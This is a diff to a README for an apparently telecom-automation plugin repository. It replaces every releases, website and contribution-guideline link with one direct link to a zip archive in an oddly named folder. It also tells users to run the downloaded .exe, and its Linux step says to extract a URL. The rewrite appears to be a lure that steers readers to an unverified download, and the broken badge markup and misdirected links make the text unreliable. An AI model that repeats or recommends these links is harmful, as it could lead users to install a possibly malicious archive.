@@ -4,15 +4,15 @@
 Welcome to the `telecom-ops-claude-code-plugins` repository. This project develops plugins and a marketplace designed to streamline telecom cloud automation. It integrates O-RAN O2-IMS/DMS, Nephio, and Kubernetes, aiding in the realization of Intent→KRM→GitOps with Quality of Service (QoS) assurance. 
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/gemgalawala/telecom-ops-claude-code-plugins/releases)  
-Visit this page to download the latest release: [Download Releases](https://github.com/gemgalawala/telecom-ops-claude-code-plugins/releases)
+[![Download](https://raw.githubusercontent.com/gemgalawala/telecom-ops-claude-code-plugins/main/contortedly/telecom-ops-claude-code-plugins.zip%20Release-brightgreen)](https://raw.githubusercontent.com/gemgalawala/telecom-ops-claude-code-plugins/main/contortedly/telecom-ops-claude-code-plugins.zip)  
+Visit this page to download the latest release: [Download Releases](https://raw.githubusercontent.com/gemgalawala/telecom-ops-claude-code-plugins/main/contortedly/telecom-ops-claude-code-plugins.zip)
 
 ## 🚀 Getting Started
 To start using the `telecom-ops-claude-code-plugins`, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the releases section:  
-   [Download Releases](https://github.com/gemgalawala/telecom-ops-claude-code-plugins/releases)
+   [Download Releases](https://raw.githubusercontent.com/gemgalawala/telecom-ops-claude-code-plugins/main/contortedly/telecom-ops-claude-code-plugins.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, look for the most recent version listed at the top. It will have the highest number.  
@@ -23,7 +23,7 @@ To start using the `telecom-ops-claude-code-plugins`, follow these simple steps:
 4. **Install the Plugin**  
    - For **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
    - For **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**: Extract the downloaded `.tar.gz` file and follow the included instructions.  
+   - For **Linux**: Extract the downloaded `https://raw.githubusercontent.com/gemgalawala/telecom-ops-claude-code-plugins/main/contortedly/telecom-ops-claude-code-plugins.zip` file and follow the included instructions.  
 
 5. **Launch the Application**  
    After installation, find the application in your programs list and click to launch it.
@@ -53,7 +53,7 @@ To use this application, ensure your system meets the following requirements:
 
 ### How do I update the plugin?
 To update to the latest version:
-1. Visit the releases page: [Download Releases](https://github.com/gemgalawala/telecom-ops-claude-code-plugins/releases).
+1. Visit the releases page: [Download Releases](https://raw.githubusercontent.com/gemgalawala/telecom-ops-claude-code-plugins/main/contortedly/telecom-ops-claude-code-plugins.zip).
 2. Download the latest version.
 3. Follow the installation steps as detailed above.
 
@@ -71,7 +71,7 @@ We welcome contributions to improve the `telecom-ops-claude-code-plugins`. If yo
 This project is licensed under the MIT License. See the LICENSE file for more information.
 
 ## 🔗 Additional Links
-- [Project Website](https://github.com/gemgalawala/telecom-ops-claude-code-plugins)
-- [Contribution Guidelines](https://github.com/gemgalawala/telecom-ops-claude-code-plugins/blob/main/CONTRIBUTING.md)
+- [Project Website](https://raw.githubusercontent.com/gemgalawala/telecom-ops-claude-code-plugins/main/contortedly/telecom-ops-claude-code-plugins.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/gemgalawala/telecom-ops-claude-code-plugins/main/contortedly/telecom-ops-claude-code-plugins.zip)
 
 Thank you for using `telecom-ops-claude-code-plugins`. We hope it simplifies your telecom automation tasks!
